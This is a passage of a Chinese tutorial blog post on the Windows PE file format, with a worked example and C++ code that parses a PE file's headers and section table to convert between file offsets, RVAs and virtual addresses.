nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到各个区块以及FOA RVA的值</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014143505239.png" alt="image-20211014143505239"></p>
<h3 id="FOA转VA转换流程"><a href="#FOA转VA转换流程" class="headerlink" title="FOA转VA转换流程"></a>FOA转VA转换流程</h3><p>首先，拿到FOA偏移量:0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150205947.png" alt="image-20211014150205947"></p>
<p>1.判断FOA是否在PE文件头之中</p>
<ul>
<li>如果在PE文件头内 FOA =RVA </li>
<li>如果不在： 判断FOA位于哪个节，差值 = FOA - 节.PointerToRawData(R Offset) , RVA = 差值 + 节.VirtualAddress(RVA) </li>
</ul>
<p>2.VA = ImageBase + RVA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014145843204.png" alt="image-20211014145843204"></p>
<h3 id="根据流程进行转换"><a href="#根据流程进行转换" class="headerlink" title="根据流程进行转换"></a>根据流程进行转换</h3><p><strong>1.判断FOA是否在文件头内</strong></p>
<p>根据e_ifanew找到PE头，发现相距甚远</p>
<p><strong>2.判断处于哪一区块</strong></p>
<p>FOA&gt;=节.PointerToRawData</p>
<p>FOA&lt;节.PointerToRawData + 当前节<strong>文件对齐</strong>后的大小=节.PointerToRawData+节.SizeOfRawData</p>
<p>翻译一下就是在哪份区块之中</p>
<p><strong>另外，利用FOA求VA时，由于是查找FOA在哪个区块中，因此要利用PointerToRawData（R Size）与 PointerToRawSize（R size)进行判断，而不是VirstualAddress(V Addr) 与 VirstualSize（V Size) 利用VA求FOA时则相反</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150609609.png" alt="image-20211014150609609"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151529385.png" alt="image-20211014151529385"></p>
<p>比较可知，根据FOA = 0x25A30可知，FOA在.idata区块之中</p>
<p>差值 = FOR - 节.PointerToRawData = 0x25A30 - 0x25000 = 0xA30</p>
<p>RVA = 节.VirstualAddress  + 差值 = 0x25000 + 0xA30 = 0x25A30</p>
<p><strong>VA = ImageBase + RVA = 0x400000 + 0x25A30 = 0x425A30</strong> </p>
<p>运行程序检验，发现完全吻合！</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151728378.png" alt="image-20211014151728378"></p>
<h3 id="代码实现FOA-转-VA"><a href="#代码实现FOA-转-VA" class="headerlink" title="代码实现FOA 转 VA"></a>代码实现FOA 转 VA</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa32</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa64</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span 